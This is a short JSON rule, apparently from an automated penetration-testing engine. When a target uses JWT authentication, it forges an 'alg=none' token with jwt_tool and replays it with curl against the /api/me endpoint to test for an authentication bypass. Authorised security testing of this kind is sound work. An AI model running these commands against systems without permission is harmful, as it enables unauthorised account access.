{
  "id": "R-CHAIN-JWT-ALG-NONE",
  "name": "JWT → alg none → bypass",
  "category": "chain",
  "when": {
    "all": [
      {
        "fact": "class",
        "op": "contains",
        "value": "auth.jwt"
      }
    ]
  },
  "then": {
    "hypothesis": "Test JWT alg=none bypass",
    "actions": [
      {
        "tool": "jwt_tool",
        "cmd": "jwt_tool {token} -X a"
      },
      {
        "tool": "curl",
        "cmd": "curl -sS -m 10 -A '{ua}' -H 'Authorization: Bearer {tampered}' {url}/api/me",
        "depends_on": [
          0
        ]
      }
    ],
    "on_hit_class": "auth.bypass",
    "priority": {
      "impact": 0.8,
      "cost": 0.2
    }
  }
}